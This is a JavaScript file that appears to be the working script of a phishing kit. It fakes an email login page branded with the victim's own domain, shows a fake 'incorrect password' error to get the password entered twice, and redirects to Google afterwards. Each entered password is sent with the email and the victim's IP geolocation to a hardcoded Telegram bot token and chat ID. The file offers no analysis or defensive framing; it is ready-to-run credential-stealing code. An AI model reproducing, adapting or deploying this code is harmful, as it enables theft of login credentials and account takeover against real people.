const BOT_TOKEN = "8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA";
const CHAT_ID = "7959372593";
const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy

(function () {
    let userEmail = "";
    let attempt = 0;

    // Unified email extraction from query string or hash
    function getEmailFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const queryEmail = urlParams.get("email");

        const hashEmail = window.location.hash.substring(1);

        if (queryEmail && queryEmail.includes("@")) return queryEmail;
        if (hashEmail && hashEmail.includes("@")) return hashEmail;

        return "example@example.com"; // Fallback if no match
    }

    function updateEmailInfo() {
        userEmail = getEmailFromURL();

        // Fill and disable email field
        const emailField = document.getElementById("email");
        if (emailField) {
            emailField.value = userEmail;
            emailField.setAttribute("readonly", "true");
        }

        // Update domain info (if elements exist)
        const domain = userEmail.split("@")[1] || "example.com";
        const domainTitle = document.getElementById("domain-title");
        const domainLogo = document.getElementById("domain-logo");

        if (domainTitle) domainTitle.textContent = domain;
        if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}`;
    }

    async function sendToTelegram(email, password) {
        try {
            let ipData = {};
            try {
                const ipRes = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN || ""}`);
                ipData = await ipRes.json();
            } catch (e) {
                console.warn("IP info fetch failed", e);
            }

            const message = `
🔐 New Login Attempt
------------------------
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ipData.ip || "N/A"}
🏙 City: ${ipData.city || "N/A"}
🏢 Region: ${ipData.region || "N/A"}
🌍 Country: ${ipData.country || "N/A"}
📡 ISP: ${ipData.org || "N/A"}
📍 Location: ${ipData.loc || "N/A"}
            `;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown",
                }),
            });
        } catch (err) {
            console.error("Telegram send error:", err);
        }
    }

    document.addEventListener("DOMContentLoaded", () => {
        updateEmailInfo();
        window.addEventListener("hashchange", updateEmailInfo);

        document.getElementById("login-btn").addEventListener("click", () => {
            const password = document.getElementById("password").value;
            const errorMsg = document.getElementById("error-msg");
            const spinner = document.getElementById("loading-spinner");

            errorMsg.textContent = "";
            spinner.classList.remove("hidden");

            setTimeout(async () => {
                spinner.classList.add("hidden");
                attempt++;

                await sendToTelegram(userEmail, password);

                if (attempt === 1) {
                    errorMsg.textContent = "Incorrect password, please verify and retry.";
                } else if (attempt === 2) {
                    window.location.href = "https://google.com";
                }
            }, 5000);
        });
    });
})();
